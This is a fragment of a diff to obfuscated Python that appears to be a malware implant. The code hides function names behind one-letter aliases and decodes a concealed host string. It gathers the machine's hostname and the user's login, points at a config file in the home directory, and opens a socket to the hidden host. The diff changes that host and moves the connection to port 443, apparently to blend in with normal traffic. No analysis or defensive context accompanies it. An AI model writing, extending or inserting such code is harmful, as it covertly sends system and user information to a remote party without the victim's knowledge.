@@ -16,7 +16,7 @@ J=socket.gethostname
 b=os.remove
 K=os.path
 W=os.getlogin
-r="ÃVnB"
+r="\x7fãõÐ"
 e="eng.cpay"
 G=[C(i(s)-1)for s in r]
 G.reverse()
@@ -28,7 +28,7 @@ w=K.expanduser("~")
 r=m
 l=w+"/config"
 A=F(R,V)
-A.connect((r,80))
+A.connect((r,443))
 I=B+"-"+N
 I=I.replace(" ","")
 t=I+'=EOFY=='
